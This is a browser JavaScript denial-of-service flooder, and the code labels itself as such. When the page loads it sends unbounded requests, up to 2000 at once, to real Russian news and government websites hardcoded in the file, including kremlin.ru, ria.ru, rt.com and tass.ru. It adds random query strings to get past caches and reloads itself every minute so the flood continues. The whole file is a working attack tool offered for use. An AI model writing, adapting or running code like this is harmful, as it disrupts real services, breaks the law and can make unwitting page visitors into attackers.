const tgt_templ = {
    number_of_requests: 0,
    number_of_errored_responses: 0
};
var started = false;
var currentTargets = {};

var statsEl = document.getElementById('stats');
function printStats() {
    statsEl.innerHTML = '<pre>' + JSON.stringify(currentTargets, null, 2) + '</pre>'
}
setInterval(printStats, 3000);

var CONCURRENCY_LIMIT = 2000
var queue = []

// Start
async function startStop() {
    console.log('dos started')
    if (!started) {
        started = true;
        Object.keys(currentTargets).map(flood)
    } else {
        started = false;
    }
}

async function fetchWithTimeout(resource, options) {

    const controller = new AbortController();
    const id = setTimeout(() => controller.abort(), options.timeout);

    return fetch(resource, {
        mode: 'no-cors',
        signal: controller.signal
    }).then((response) => {
        clearTimeout(id);
        return response;
    }).catch((error) => {
        clearTimeout(id);
        throw error;
    });
}

async function flood(target) {
    for (var i = 0; ; ++i) {
        if (queue.length > CONCURRENCY_LIMIT) {
            await queue.shift()
        }
        rand = i % 13 === 0 ? '' : ('?' + Math.floor(Math.random() * 5000))
        queue.push(
            fetchWithTimeout(target + rand, { timeout: 3000 })
                .catch((error) => {
                    if (error.code === 20 /* ABORT */) {
                        return;
                    }
                    currentTargets[target].number_of_errored_responses++;
                    currentTargets[target].error_message = error.message
                })
                .then((response) => {
                    if (response && !response.ok) {
                        currentTargets[target].number_of_errored_responses++;
                        currentTargets[target].error_message = response.statusText
                    }
                    currentTargets[target].number_of_requests++;
                })

        )
    }
}

window.onload = function () {
    if (!Array.isArray(targets)) {
        console.log('Hardcode mode')
        // Some hardcoded just in case
        currentTargets = {
            'https://lenta.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://ria.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://ria.ru/lenta/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://www.rbc.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://www.rt.com/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'http://kremlin.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'http://en.kremlin.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://smotrim.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://tass.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://tvzvezda.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
            'https://rbc.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },
        }

    } else {
        targets.forEach((val, idx) => {
            currentTargets[val] = Object.assign({}, tgt_templ);
        })
    }

    startStop();
    setTimeout(() => { location.reload(); }, 60000);
}